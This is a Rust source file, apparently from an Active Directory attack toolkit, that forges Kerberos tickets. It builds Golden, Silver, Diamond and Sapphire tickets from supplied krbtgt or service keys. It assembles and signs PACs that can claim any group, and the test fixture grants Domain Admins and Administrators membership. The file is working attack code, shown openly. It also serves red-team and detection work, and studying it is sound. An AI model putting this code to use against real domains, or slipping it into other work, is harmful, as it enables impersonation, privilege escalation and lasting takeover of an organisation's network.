//! Explicit Kerberos ticket construction.
//!
//! Construction never discovers keys, SIDs, names, or lifetimes. Callers must
//! provide every identity and signing input, and the resulting ticket remains
//! in memory until it is deliberately exported through [`super::export_ticket_file`].
//! Golden and Silver tickets build a fresh, signed PAC. Diamond tickets retain
//! the encrypted body of a caller-supplied TGT while replacing its PAC, and
//! Sapphire tickets transplant a PAC issued by the KDC through the bounded
//! S4U2Self+U2U path in [`super::KerberosClient::request_sapphire_pac`].

use std::collections::BTreeSet;

use ms_pac_forge::pac::{
    ForgeIdentity, PAC_CLIENT_INFO_TYPE, PAC_KDC_CHECKSUM, PAC_LOGON_INFO, PAC_SERVER_CHECKSUM,
    PAC_TICKET_CHECKSUM, assemble_pac, parse_pac,
};
use picky_asn1::bit_string::BitString;
use picky_asn1::date::GeneralizedTime;
use picky_asn1::wrapper::{
    Asn1SequenceOf, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag6,
    ExplicitContextTag7, ExplicitContextTag8, ExplicitContextTag10, GeneralizedTimeAsn1,
    OctetStringAsn1, Optional,
};
use picky_krb::constants::types::{NT_PRINCIPAL, NT_SRV_INST};
use picky_krb::data_types::{
    AuthorizationData, AuthorizationDataInner, EncTicketPart, EncTicketPartInner, EncryptedData,
    EncryptionKey, KerberosFlags, Ticket, TicketInner, TransitedEncoding,
};
use rand::rngs::OsRng;
use rand::{CryptoRng, RngCore};
use time::OffsetDateTime;

use super::assessment::{ServiceTicket, validate_spn};
use super::client::{
    encode_der, encrypted_data_type, integer_as_i32, integer_i32, integer_u32, kerberos_string,
    principal, principal_name, validate_realm, validate_username,
};
use super::crypto::keyed_checksum;
use super::s4u::SapphirePacEvidence;
use super::{KerberosEncryptionType, KerberosError, TicketGrantingTicket, decrypt, encrypt};

const KERBEROS_VERSION: i32 = 5;
const TICKET_KEY_USAGE: i32 = 2;
const PAC_CHECKSUM_KEY_USAGE: i32 = 17;
const MAX_GROUPS: usize = 1_024;
const MAX_EXTRA_SIDS: usize = 128;
const MAX_PAC_BUFFERS: usize = 128;
const MAX_PAC_SIZE: usize = 16 * 1024 * 1024;
const MAX_TICKET_LIFETIME_SECONDS: i64 = 10 * 365 * 24 * 60 * 60;

/// Long-term key used to seal a constructed ticket and sign its PAC.
///
/// Key bytes are private and deliberately omitted from `Debug` output.
#[derive(Clone, PartialEq, Eq)]
pub enum TicketConstructionKey {
    Rc4([u8; 16]),
    Aes128([u8; 16]),
    Aes256([u8; 32]),
}

impl core::fmt::Debug for TicketConstructionKey {
    fn fmt(&self, formatter: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        formatter.write_str(match self {
            Self::Rc4(_) => "TicketConstructionKey::Rc4([REDACTED])",
            Self::Aes128(_) => "TicketConstructionKey::Aes128([REDACTED])",
            Self::Aes256(_) => "TicketConstructionKey::Aes256([REDACTED])",
        })
    }
}

impl TicketConstructionKey {
    pub fn from_rc4_hex(value: &str) -> Result<Self, KerberosError> {
        Ok(Self::Rc4(parse_hex_key::<16>(value, "RC4 key")?))
    }

    pub fn from_aes128_hex(value: &str) -> Result<Self, KerberosError> {
        Ok(Self::Aes128(parse_hex_key::<16>(value, "AES-128 key")?))
    }

    pub fn from_aes256_hex(value: &str) -> Result<Self, KerberosError> {
        Ok(Self::Aes256(parse_hex_key::<32>(value, "AES-256 key")?))
    }

    #[must_use]
    pub const fn encryption_type(&self) -> KerberosEncryptionType {
        match self {
            Self::Rc4(_) => KerberosEncryptionType::Rc4Hmac,
            Self::Aes128(_) => KerberosEncryptionType::Aes128CtsHmacSha196,
            Self::Aes256(_) => KerberosEncryptionType::Aes256CtsHmacSha196,
        }
    }

    fn bytes(&self) -> &[u8] {
        match self {
            Self::Rc4(key) | Self::Aes128(key) => key,
            Self::Aes256(key) => key,
        }
    }
}

/// Explicit AD identity material encoded in a newly constructed PAC.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TicketConstructionIdentity {
    pub username: String,
    pub user_rid: u32,
    pub primary_group_rid: u32,
    pub group_rids: Vec<u32>,
    pub domain_sid: String,
    pub logon_server: String,
    pub logon_domain: String,
    pub extra_sids: Vec<String>,
}

/// Explicit ticket timing and flag values.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct TicketConstructionLifetime {
    pub issued_at_unix: i64,
    pub valid_from_unix: i64,
    pub valid_until_unix: i64,
    pub renewable_until_unix: Option<i64>,
    pub ticket_flags: u32,
}

/// Outer ticket settings that are not derived from a target or directory.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TicketConstructionOptions {
    pub realm: String,
    pub lifetime: TicketConstructionLifetime,
    pub kvno: Option<u32>,
}

/// Build a TGT with a freshly generated session key and a PAC signed by the
/// explicitly supplied krbtgt key.
pub fn forge_golden_ticket(
    identity: &TicketConstructionIdentity,
    options: &TicketConstructionOptions,
    krbtgt_key: &TicketConstructionKey,
) -> Result<TicketGrantingTicket, KerberosError> {
    let mut rng = OsRng;
    forge_golden_ticket_with_rng(identity, options, krbtgt_key, &mut rng)
}

/// Build a service ticket with separate, explicit service and KDC PAC-signing
/// keys. Passing the same key twice intentionally requests traditional
/// service-key-only Silver-ticket semantics.
pub fn forge_silver_ticket(
    identity: &TicketConstructionIdentity,
    options: &TicketConstructionOptions,
    service_principal: &str,
    service_key: &TicketConstructionKey,
    kdc_signing_key: &TicketConstructionKey,
) -> Result<ServiceTicket, KerberosError> {
    let mut rng = OsRng;
    forge_silver_ticket_with_rng(
        identity,
        options,
        service_principal,
        service_key,
        kdc_signing_key,
        &mut rng,
    )
}

/// Replace the PAC in a decryptable TGT while preserving its KDC-issued
/// session key, flags, and lifetime. The supplied identity must name the same
/// client as the template TGT.
pub fn forge_diamond_ticket(
    template: &TicketGrantingTicket,
    identity: &TicketConstructionIdentity,
    krbtgt_key: &TicketConstructionKey,
) -> Result<TicketGrantingTicket, KerberosError> {
    validate_identity(identity)?;
    if !identity
        .username
        .eq_ignore_ascii_case(template.client_principal())
    {
        return Err(KerberosError::InvalidMessage(
            "Diamond PAC identity must match the template TGT client".to_owned(),
        ));
    }
    let mut encrypted_part = decrypt_ticket_part(&template.ticket, krbtgt_key)?;
    validate_template_identity(&encrypted_part, template)?;
    let pac = build_identity_pac(identity, template.issued_at_unix(), krbtgt_key, krbtgt_key)?;
    replace_pac(&mut encrypted_part.0.authorization_data, &pac)?;
    let mut output = template.clone();
    output.ticket = reseal_ticket(&template.ticket, &encrypted_part, krbtgt_key)?;
    Ok(output)
}

/// Replace a template TGT's PAC with KDC-issued S4U2Self+U2U evidence. The
/// template lifetime is retained and the caller must supply the matching
/// krbtgt key used to re-seal the ticket.
pub fn forge_sapphire_ticket(
    template: &TicketGrantingTicket,
    evidence: &SapphirePacEvidence,
    krbtgt_key: &TicketConstructionKey,
) -> Result<TicketGrantingTicket, KerberosError> {
    if !template.realm().eq_ignore_ascii_case(evidence.realm()) {
        return Err(KerberosError::InvalidMessage(
            "Sapphire PAC realm does not match the template TGT".to_owned(),
        ));
    }
    let mut encrypted_part = decrypt_ticket_part(&template.ticket, krbtgt_key)?;
    validate_template_identity(&encrypted_part, template)?;
    encrypted_part.0.cname = ExplicitContextTag3::from(principal(
        NT_PRINCIPAL,
        &[evidence.impersonated_principal()],
    )?);
    encrypted_part.0.crealm = ExplicitContextTag2::from(kerberos_string(evidence.realm())?);
    let pac = rebuild_and_sign_pac(evidence.pac_bytes(), krbtgt_key, krbtgt_key, None)?;
    replace_pac(&mut encrypted_part.0.authorization_data, &pac)?;
    let mut output = template.clone();
    output.ticket = reseal_ticket(&template.ticket, &encrypted_part, krbtgt_key)?;
    output.client_principal = evidence.impersonated_principal().to_owned();
    output.realm = evidence.realm().to_owned();
    Ok(output)
}

fn forge_golden_ticket_with_rng<R: RngCore + CryptoRng>(
    identity: &TicketConstructionIdentity,
    options: &TicketConstructionOptions,
    krbtgt_key: &TicketConstructionKey,
    rng: &mut R,
) -> Result<TicketGrantingTicket, KerberosError> {
    validate_inputs(identity, options)?;
    let realm = options.realm.to_ascii_uppercase();
    let pac = build_identity_pac(
        identity,
        options.lifetime.issued_at_unix,
        krbtgt_key,
        krbtgt_key,
    )?;
    let session_key = random_session_key(krbtgt_key.encryption_type(), rng);
    let ticket = build_ticket(
        identity,
        options,
        &["krbtgt", &realm],
        &session_key,
        &pac,
        krbtgt_key,
        rng,
    )?;
    Ok(TicketGrantingTicket {
        ticket,
        session_key,
        session_encryption_type: krbtgt_key.encryption_type(),
        client_principal: identity.username.clone(),
        realm: realm.clone(),
        kdc_realm: realm,
        issued_at_unix: options.lifetime.issued_at_unix,
        valid_from_unix: options.lifetime.valid_from_unix,
        valid_until_unix: options.lifetime.valid_until_unix,
        renewable_until_unix: options.lifetime.renewable_until_unix,
        ticket_flags: options.lifetime.ticket_flags,
    })
}

fn forge_silver_ticket_with_rng<R: RngCore + CryptoRng>(
    identity: &TicketConstructionIdentity,
    options: &TicketConstructionOptions,
    service_principal: &str,
    service_key: &TicketConstructionKey,
    kdc_signing_key: &TicketConstructionKey,
    rng: &mut R,
) -> Result<ServiceTicket, KerberosError> {
    validate_inputs(identity, options)?;
    validate_spn(service_principal)?;
    require_same_profile(service_key, kdc_signing_key)?;
    let pac = build_identity_pac(
        identity,
        options.lifetime.issued_at_unix,
        service_key,
        kdc_signing_key,
    )?;
    let session_key = random_session_key(service_key.encryption_type(), rng);
    let components = service_principal.split('/').collect::<Vec<_>>();
    let ticket = build_ticket(
        identity,
        options,
        &components,
        &session_key,
        &pac,
        service_key,
        rng,
    )?;
    Ok(ServiceTicket {
        ticket,
        session_key,
        session_encryption_type: service_key.encryption_type(),
        client_principal: identity.username.clone(),
        client_realm: options.realm.to_ascii_uppercase(),
        service_principal_name: service_principal.to_owned(),
        realm: options.realm.to_ascii_uppercase(),
        issued_at_unix: options.lifetime.issued_at_unix,
        valid_from_unix: options.lifetime.valid_from_unix,
        valid_until_unix: options.lifetime.valid_until_unix,
        renewable_until_unix: options.lifetime.renewable_until_unix,
        ticket_flags: options.lifetime.ticket_flags,
    })
}

#[allow(clippy::too_many_arguments)]
fn build_ticket<R: RngCore + CryptoRng>(
    identity: &TicketConstructionIdentity,
    options: &TicketConstructionOptions,
    service_components: &[&str],
    session_key: &[u8],
    pac: &[u8],
    ticket_key: &TicketConstructionKey,
    rng: &mut R,
) -> Result<Ticket, KerberosError> {
    let realm = options.realm.to_ascii_uppercase();
    let encryption_type = ticket_key.encryption_type();
    let encrypted_part = EncTicketPart::from(EncTicketPartInner {
        flags: ExplicitContextTag0::from(KerberosFlags::from(BitString::with_bytes(
            options.lifetime.ticket_flags.to_be_bytes().to_vec(),
        ))),
        key: ExplicitContextTag1::from(EncryptionKey {
            key_type: ExplicitContextTag0::from(integer_i32(encryption_type.number())),
            key_value: ExplicitContextTag1::from(OctetStringAsn1::from(session_key.to_vec())),
        }),
        crealm: ExplicitContextTag2::from(kerberos_string(&realm)?),
        cname: ExplicitContextTag3::from(principal(NT_PRINCIPAL, &[&identity.username])?),
        transited: ExplicitContextTag4::from(TransitedEncoding {
            tr_type: ExplicitContextTag0::from(integer_i32(0)),
            contents: ExplicitContextTag1::from(OctetStringAsn1::from(Vec::new())),
        }),
        auth_time: ExplicitContextTag5::from(kerberos_time(options.lifetime.issued_at_unix)?),
        starttime: Optional::from(Some(ExplicitContextTag6::from(kerberos_time(
            options.lifetime.valid_from_unix,
        )?))),
        endtime: ExplicitContextTag7::from(kerberos_time(options.lifetime.valid_until_unix)?),
        renew_till: Optional::from(
            options
                .lifetime
                .renewable_until_unix
                .map(kerberos_time)
                .transpose()?
                .map(ExplicitContextTag8::from),
        ),
        caddr: Optional::from(None),
        authorization_data: Optional::from(Some(ExplicitContextTag10::from(
            pac_authorization_data(pac)?,
        ))),
    });
    let ciphertext = encrypt(
        encryption_type,
        ticket_key.bytes(),
        TICKET_KEY_USAGE,
        &encode_der(&encrypted_part)?,
        rng,
    )?;
    Ok(Ticket::from(TicketInner {
        tkt_vno: ExplicitContextTag0::from(integer_i32(KERBEROS_VERSION)),
        realm: ExplicitContextTag1::from(kerberos_string(&realm)?),
        sname: ExplicitContextTag2::from(principal(NT_SRV_INST, service_components)?),
        enc_part: ExplicitContextTag3::from(EncryptedData {
            etype: ExplicitContextTag0::from(integer_i32(encryption_type.number())),
            kvno: Optional::from(options.kvno.map(integer_u32).map(ExplicitContextTag1::from)),
            cipher: ExplicitContextTag2::from(OctetStringAsn1::from(ciphertext)),
        }),
    }))
}

fn decrypt_ticket_part(
    ticket: &Ticket,
    key: &TicketConstructionKey,
) -> Result<EncTicketPart, KerberosError> {
    let actual = encrypted_data_type(&ticket.0.enc_part.0)?;
    if actual != key.encryption_type() {
        return Err(KerberosError::InvalidMessage(format!(
            "ticket is encrypted with {actual}, but the supplied key is {}",
            key.encryption_type()
        )));
    }
    let plaintext = decrypt(
        actual,
        key.bytes(),
        TICKET_KEY_USAGE,
        &ticket.0.enc_part.0.cipher.0.0,
    )?;
    picky_asn1_der::from_bytes(&plaintext)
        .map_err(|error| KerberosError::InvalidMessage(format!("invalid EncTicketPart: {error}")))
}

fn reseal_ticket(
    ticket: &Ticket,
    encrypted_part: &EncTicketPart,
    key: &TicketConstructionKey,
) -> Result<Ticket, KerberosError> {
    let mut rng = OsRng;
    let ciphertext = encrypt(
        key.encryption_type(),
        key.bytes(),
        TICKET_KEY_USAGE,
        &encode_der(encrypted_part)?,
        &mut rng,
    )?;
    let mut output = ticket.clone();
    output.0.enc_part.0.cipher = ExplicitContextTag2::from(OctetStringAsn1::from(ciphertext));
    Ok(output)
}

fn validate_template_identity(
    encrypted_part: &EncTicketPart,
    template: &TicketGrantingTicket,
) -> Result<(), KerberosError> {
    let client = principal_name(&encrypted_part.0.cname.0);
    let realm = encrypted_part.0.crealm.0.0.to_string();
    if !client.eq_ignore_ascii_case(template.client_principal())
        || !realm.eq_ignore_ascii_case(template.realm())
    {
        return Err(KerberosError::InvalidMessage(
            "template TGT metadata does not match its encrypted client identity".to_owned(),
        ));
    }
    Ok(())
}

fn build_identity_pac(
    identity: &TicketConstructionIdentity,
    issued_at_unix: i64,
    server_key: &TicketConstructionKey,
    kdc_key: &TicketConstructionKey,
) -> Result<Vec<u8>, KerberosError> {
    require_same_profile(server_key, kdc_key)?;
    let forge_identity = ForgeIdentity {
        user: identity.username.clone(),
        rid: identity.user_rid,
        primary_gid: identity.primary_group_rid,
        group_rids: identity.group_rids.clone(),
        domain_subauths: parse_domain_sid(&identity.domain_sid)?,
        logon_server: identity.logon_server.clone(),
        logon_domain: identity.logon_domain.clone(),
        extra_sids: identity
            .extra_sids
            .iter()
            .map(|sid| parse_sid(sid))
            .collect::<Result<Vec<_>, _>>()?,
    };
    let template = match server_key.encryption_type() {
        KerberosEncryptionType::Rc4Hmac => assemble_pac(&forge_identity, &[0; 16], &[0; 16], true),
        KerberosEncryptionType::Aes128CtsHmacSha196
        | KerberosEncryptionType::Aes256CtsHmacSha196 => {
            assemble_pac(&forge_identity, &[0; 32], &[0; 32], false)
        }
    }
    .map_err(|error| KerberosError::InvalidMessage(format!("PAC construction failed: {error}")))?;
    rebuild_and_sign_pac(&template, server_key, kdc_key, Some(issued_at_unix))
}

fn rebuild_and_sign_pac(
    source: &[u8],
    server_key: &TicketConstructionKey,
    kdc_key: &TicketConstructionKey,
    issued_at_unix: Option<i64>,
) -> Result<Vec<u8>, KerberosError> {
    require_same_profile(server_key, kdc_key)?;
    if source.len() > MAX_PAC_SIZE {
        return Err(KerberosError::InvalidMessage(format!(
            "PAC exceeds the {MAX_PAC_SIZE}-byte limit"
        )));
    }
    let parsed = parse_pac(source)
        .map_err(|error| KerberosError::InvalidMessage(format!("invalid PAC: {error}")))?;
    if parsed.buffers.len() > MAX_PAC_BUFFERS {
        return Err(KerberosError::InvalidMessage(format!(
            "PAC exceeds the {MAX_PAC_BUFFERS}-buffer limit"
        )));
    }
    let mut seen = BTreeSet::new();
    let mut buffers = Vec::with_capacity(parsed.buffers.len());
    for buffer in parsed.buffers {
        if !seen.insert(buffer.ul_type) {
            return Err(KerberosError::InvalidMessage(format!(
                "PAC contains duplicate buffer type {}",
                buffer.ul_type
            )));
        }
        if matches!(
            buffer.ul_type,
            PAC_SERVER_CHECKSUM | PAC_KDC_CHECKSUM | PAC_TICKET_CHECKSUM
        ) {
            continue;
        }
        buffers.push((buffer.ul_type, buffer.data));
    }
    if let Some(timestamp) = issued_at_unix {
        patch_pac_timestamps(&mut buffers, timestamp)?;
    }
    let signature_len = match server_key.encryption_type() {
        KerberosEncryptionType::Rc4Hmac => 16,
        KerberosEncryptionType::Aes128CtsHmacSha196
        | KerberosEncryptionType::Aes256CtsHmacSha196 => 12,
    };
    let signature_type = keyed_checksum(
        server_key.encryption_type(),
        server_key.bytes(),
        PAC_CHECKSUM_KEY_USAGE,
        &[],
    )?
    .0;
    let mut signature_template = Vec::with_capacity(4 + signature_len);
    signature_template.extend_from_slice(&signature_type.to_le_bytes());
    signature_template.resize(4 + signature_len, 0);
    buffers.push((PAC_SERVER_CHECKSUM, signature_template.clone()));
    buffers.push((PAC_KDC_CHECKSUM, signature_template));
    sign_pac_buffers(buffers, server_key, kdc_key)
}

fn sign_pac_buffers(
    buffers: Vec<(u32, Vec<u8>)>,
    server_key: &TicketConstructionKey,
    kdc_key: &TicketConstructionKey,
) -> Result<Vec<u8>, KerberosError> {
    let count = buffers.len();
    if count > MAX_PAC_BUFFERS {
        return Err(KerberosError::InvalidMessage(
            "PAC contains too many buffers".to_owned(),
        ));
    }
    let header_len = 8_usize
        .checked_add(count.checked_mul(16).ok_or_else(|| {
            KerberosError::InvalidMessage("PAC descriptor length overflow".to_owned())
        })?)
        .ok_or_else(|| KerberosError::InvalidMessage("PAC header length overflow".to_owned()))?;
    let mut pac = Vec::with_capacity(header_len);
    pac.extend_from_slice(&(count as u32).to_le_bytes());
    pac.extend_from_slice(&0_u32.to_le_bytes());
    let mut payload = Vec::new();
    let mut signature_offsets = (None, None);
    for (buffer_type, data) in &buffers {
        let offset = header_len.checked_add(payload.len()).ok_or_else(|| {
            KerberosError::InvalidMessage("PAC payload offset overflow".to_owned())
        })?;
        if offset > u64::MAX as usize || data.len() > u32::MAX as usize {
            return Err(KerberosError::InvalidMessage(
                "PAC descriptor cannot represent its payload".to_owned(),
            ));
        }
        pac.extend_from_slice(&buffer_type.to_le_bytes());
        pac.extend_from_slice(&(data.len() as u32).to_le_bytes());
        pac.extend_from_slice(&(offset as u64).to_le_bytes());
        if *buffer_type == PAC_SERVER_CHECKSUM {
            signature_offsets.0 = Some((offset, data.len()));
        } else if *buffer_type == PAC_KDC_CHECKSUM {
            signature_offsets.1 = Some((offset, data.len()));
        }
        payload.extend_from_slice(data);
        while payload.len() % 8 != 0 {
            payload.push(0);
        }
    }
    pac.extend_from_slice(&payload);
    if pac.len() > MAX_PAC_SIZE {
        return Err(KerberosError::InvalidMessage(format!(
            "PAC exceeds the {MAX_PAC_SIZE}-byte limit"
        )));
    }
    let (server_offset, server_len) = signature_offsets.0.ok_or_else(|| {
        KerberosError::InvalidMessage("PAC has no server checksum buffer".to_owned())
    })?;
    let (kdc_offset, kdc_len) = signature_offsets.1.ok_or_else(|| {
        KerberosError::InvalidMessage("PAC has no KDC checksum buffer".to_owned())
    })?;
    let (_, server_signature) = keyed_checksum(
        server_key.encryption_type(),
        server_key.bytes(),
        PAC_CHECKSUM_KEY_USAGE,
        &pac,
    )?;
    if server_signature.len() + 4 != server_len {
        return Err(KerberosError::InvalidMessage(
            "PAC server checksum buffer has the wrong length".to_owned(),
        ));
    }
    pac[server_offset + 4..server_offset + server_len].copy_from_slice(&server_signature);
    let (_, kdc_signature) = keyed_checksum(
        kdc_key.encryption_type(),
        kdc_key.bytes(),
        PAC_CHECKSUM_KEY_USAGE,
        &server_signature,
    )?;
    if kdc_signature.len() + 4 != kdc_len {
        return Err(KerberosError::InvalidMessage(
            "PAC KDC checksum buffer has the wrong length".to_owned(),
        ));
    }
    pac[kdc_offset + 4..kdc_offset + kdc_len].copy_from_slice(&kdc_signature);
    Ok(pac)
}

fn patch_pac_timestamps(
    buffers: &mut [(u32, Vec<u8>)],
    issued_at_unix: i64,
) -> Result<(), KerberosError> {
    let filetime = unix_to_filetime(issued_at_unix)?.to_le_bytes();
    let logon = buffers
        .iter_mut()
        .find(|(buffer_type, _)| *buffer_type == PAC_LOGON_INFO)
        .ok_or_else(|| KerberosError::InvalidMessage("PAC has no LOGON_INFO".to_owned()))?;
    if logon.1.len() < 56 {
        return Err(KerberosError::InvalidMessage(
            "PAC LOGON_INFO is truncated".to_owned(),
        ));
    }
    logon.1[16..24].copy_from_slice(&filetime);
    logon.1[40..48].copy_from_slice(&filetime);
    logon.1[48..56].copy_from_slice(&filetime);
    let client = buffers
        .iter_mut()
        .find(|(buffer_type, _)| *buffer_type == PAC_CLIENT_INFO_TYPE)
        .ok_or_else(|| KerberosError::InvalidMessage("PAC has no CLIENT_INFO".to_owned()))?;
    if client.1.len() < 8 {
        return Err(KerberosError::InvalidMessage(
            "PAC CLIENT_INFO is truncated".to_owned(),
        ));
    }
    client.1[..8].copy_from_slice(&filetime);
    Ok(())
}

fn pac_authorization_data(pac: &[u8]) -> Result<AuthorizationData, KerberosError> {
    let inner = AuthorizationData::from(vec![AuthorizationDataInner {
        ad_type: ExplicitContextTag0::from(integer_i32(128)),
        ad_data: ExplicitContextTag1::from(OctetStringAsn1::from(pac.to_vec())),
    }]);
    Ok(Asn1SequenceOf::from(vec![AuthorizationDataInner {
        ad_type: ExplicitContextTag0::from(integer_i32(1)),
        ad_data: ExplicitContextTag1::from(OctetStringAsn1::from(encode_der(&inner)?)),
    }]))
}

fn replace_pac(
    authorization_data: &mut Optional<Option<ExplicitContextTag10<AuthorizationData>>>,
    pac: &[u8],
) -> Result<(), KerberosError> {
    let Some(outer) = authorization_data.0.as_mut() else {
        *authorization_data = Optional::from(Some(ExplicitContextTag10::from(
            pac_authorization_data(pac)?,
        )));
        return Ok(());
    };
    let mut replaced = false;
    let mut relevant_index = None;
    for (index, outer_entry) in outer.0.0.iter_mut().enumerate() {
        if integer_as_i32(&outer_entry.ad_type.0) != Some(1) {
            continue;
        }
        relevant_index.get_or_insert(index);
        let mut inner: AuthorizationData = picky_asn1_der::from_bytes(&outer_entry.ad_data.0.0)
            .map_err(|error| {
                KerberosError::InvalidMessage(format!("invalid AD-IF-RELEVANT value: {error}"))
            })?;
        for inner_entry in &mut inner.0 {
            if integer_as_i32(&inner_entry.ad_type.0) == Some(128) {
                if replaced {
                    return Err(KerberosError::InvalidMessage(
                        "ticket contains more than one PAC".to_owned(),
                    ));
                }
                inner_entry.ad_data =
                    ExplicitContextTag1::from(OctetStringAsn1::from(pac.to_vec()));
                replaced = true;
            }
        }
        outer_entry.ad_data = ExplicitContextTag1::from(OctetStringAsn1::from(encode_der(&inner)?));
    }
    if !replaced {
        let pac_entry = AuthorizationDataInner {
            ad_type: ExplicitContextTag0::from(integer_i32(128)),
            ad_data: ExplicitContextTag1::from(OctetStringAsn1::from(pac.to_vec())),
        };
        if let Some(index) = relevant_index {
            let entry = &mut outer.0.0[index];
            let mut inner: AuthorizationData = picky_asn1_der::from_bytes(&entry.ad_data.0.0)
                .map_err(|error| {
                    KerberosError::InvalidMessage(format!("invalid AD-IF-RELEVANT value: {error}"))
                })?;
            inner.0.push(pac_entry);
            entry.ad_data = ExplicitContextTag1::from(OctetStringAsn1::from(encode_der(&inner)?));
        } else {
            let inner = AuthorizationData::from(vec![pac_entry]);
            outer.0.0.push(AuthorizationDataInner {
                ad_type: ExplicitContextTag0::from(integer_i32(1)),
                ad_data: ExplicitContextTag1::from(OctetStringAsn1::from(encode_der(&inner)?)),
            });
        }
    }
    Ok(())
}

fn validate_inputs(
    identity: &TicketConstructionIdentity,
    options: &TicketConstructionOptions,
) -> Result<(), KerberosError> {
    validate_identity(identity)?;
    validate_realm(&options.realm)?;
    validate_lifetime(options.lifetime)
}

fn validate_identity(identity: &TicketConstructionIdentity) -> Result<(), KerberosError> {
    validate_username(&identity.username)?;
    parse_domain_sid(&identity.domain_sid)?;
    if identity.group_rids.len() > MAX_GROUPS {
        return Err(KerberosError::InvalidMessage(format!(
            "PAC group list exceeds the {MAX_GROUPS}-entry limit"
        )));
    }
    if identity.extra_sids.len() > MAX_EXTRA_SIDS {
        return Err(KerberosError::InvalidMessage(format!(
            "PAC extra SID list exceeds the {MAX_EXTRA_SIDS}-entry limit"
        )));
    }
    for sid in &identity.extra_sids {
        parse_sid(sid)?;
    }
    for (label, value) in [
        ("logon server", identity.logon_server.as_str()),
        ("logon domain", identity.logon_domain.as_str()),
    ] {
        if value.is_empty() || value.len() > 256 || value.chars().any(char::is_control) {
            return Err(KerberosError::InvalidMessage(format!(
                "PAC {label} is invalid"
            )));
        }
    }
    Ok(())
}

fn validate_lifetime(lifetime: TicketConstructionLifetime) -> Result<(), KerberosError> {
    let duration = lifetime
        .valid_until_unix
        .checked_sub(lifetime.valid_from_unix);
    if lifetime.issued_at_unix > lifetime.valid_from_unix
        || lifetime.valid_from_unix >= lifetime.valid_until_unix
        || lifetime
            .renewable_until_unix
            .is_some_and(|renew| renew < lifetime.valid_until_unix)
        || duration.is_none_or(|duration| duration > MAX_TICKET_LIFETIME_SECONDS)
    {
        return Err(KerberosError::InvalidMessage(
            "ticket lifetime is inconsistent or exceeds ten years".to_owned(),
        ));
    }
    kerberos_time(lifetime.issued_at_unix)?;
    kerberos_time(lifetime.valid_from_unix)?;
    kerberos_time(lifetime.valid_until_unix)?;
    if let Some(renew) = lifetime.renewable_until_unix {
        kerberos_time(renew)?;
    }
    Ok(())
}

fn require_same_profile(
    left: &TicketConstructionKey,
    right: &TicketConstructionKey,
) -> Result<(), KerberosError> {
    if left.encryption_type() != right.encryption_type() {
        return Err(KerberosError::InvalidMessage(
            "PAC server and KDC signing keys must use the same encryption profile".to_owned(),
        ));
    }
    Ok(())
}

fn random_session_key<R: RngCore>(encryption_type: KerberosEncryptionType, rng: &mut R) -> Vec<u8> {
    let mut key = vec![0_u8; encryption_type.key_len()];
    rng.fill_bytes(&mut key);
    key
}

fn kerberos_time(unix_time: i64) -> Result<GeneralizedTimeAsn1, KerberosError> {
    OffsetDateTime::from_unix_timestamp(unix_time)
        .map(GeneralizedTime::from)
        .map(GeneralizedTimeAsn1::from)
        .map_err(|error| KerberosError::InvalidMessage(error.to_string()))
}

fn unix_to_filetime(unix_time: i64) -> Result<u64, KerberosError> {
    let seconds = i128::from(unix_time) + 11_644_473_600_i128;
    let value = seconds.checked_mul(10_000_000).ok_or_else(|| {
        KerberosError::InvalidMessage("PAC FILETIME timestamp overflow".to_owned())
    })?;
    u64::try_from(value)
        .map_err(|_| KerberosError::InvalidMessage("PAC FILETIME is out of range".to_owned()))
}

fn parse_sid(value: &str) -> Result<Vec<u32>, KerberosError> {
    let mut components = value.split('-');
    if components.next() != Some("S") || components.next() != Some("1") {
        return Err(KerberosError::InvalidMessage(format!(
            "SID {value:?} must begin with S-1"
        )));
    }
    let authority = components.next().ok_or_else(|| {
        KerberosError::InvalidMessage(format!("SID {value:?} has no identifier authority"))
    })?;
    if authority != "5" {
        return Err(KerberosError::InvalidMessage(format!(
            "SID {value:?} must use NT authority 5"
        )));
    }
    let subauthorities = components
        .map(|component| {
            component.parse::<u32>().map_err(|_| {
                KerberosError::InvalidMessage(format!(
                    "SID {value:?} contains an invalid sub-authority"
                ))
            })
        })
        .collect::<Result<Vec<_>, _>>()?;
    if subauthorities.is_empty() || subauthorities.len() > 15 {
        return Err(KerberosError::InvalidMessage(format!(
            "SID {value:?} must contain between one and fifteen sub-authorities"
        )));
    }
    Ok(subauthorities)
}

fn parse_domain_sid(value: &str) -> Result<Vec<u32>, KerberosError> {
    let subauthorities = parse_sid(value)?;
    if subauthorities.len() != 4 || subauthorities[0] != 21 {
        return Err(KerberosError::InvalidMessage(format!(
            "domain SID {value:?} must use the S-1-5-21-A-B-C form"
        )));
    }
    Ok(subauthorities)
}

fn parse_hex_key<const N: usize>(value: &str, label: &str) -> Result<[u8; N], KerberosError> {
    let value = value.trim();
    if value.len() != N * 2 || !value.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        return Err(KerberosError::Crypto(format!(
            "{label} must contain exactly {} hexadecimal characters",
            N * 2
        )));
    }
    let mut output = [0_u8; N];
    for (index, byte) in output.iter_mut().enumerate() {
        *byte = u8::from_str_radix(&value[index * 2..index * 2 + 2], 16)
            .map_err(|error| KerberosError::Crypto(error.to_string()))?;
    }
    Ok(output)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn identity() -> TicketConstructionIdentity {
        TicketConstructionIdentity {
            username: "alice".to_owned(),
            user_rid: 1_101,
            primary_group_rid: 513,
            group_rids: vec![513, 512],
            domain_sid: "S-1-5-21-111-222-333".to_owned(),
            logon_server: "DC01".to_owned(),
            logon_domain: "EXAMPLE".to_owned(),
            extra_sids: vec!["S-1-5-32-544".to_owned()],
        }
    }

    fn options() -> TicketConstructionOptions {
        TicketConstructionOptions {
            realm: "EXAMPLE.TEST".to_owned(),
            lifetime: TicketConstructionLifetime {
                issued_at_unix: 1_700_000_000,
                valid_from_unix: 1_700_000_000,
                valid_until_unix: 1_700_036_000,
                renewable_until_unix: Some(1_700_604_800),
                ticket_flags: 0x40e1_0000,
            },
            kvno: Some(2),
        }
    }

    #[test]
    fn golden_ticket_round_trips_for_all_supported_profiles() {
        let keys = [
            TicketConstructionKey::Rc4([0x11; 16]),
            TicketConstructionKey::Aes128([0x22; 16]),
            TicketConstructionKey::Aes256([0x33; 32]),
        ];
        for key in keys {
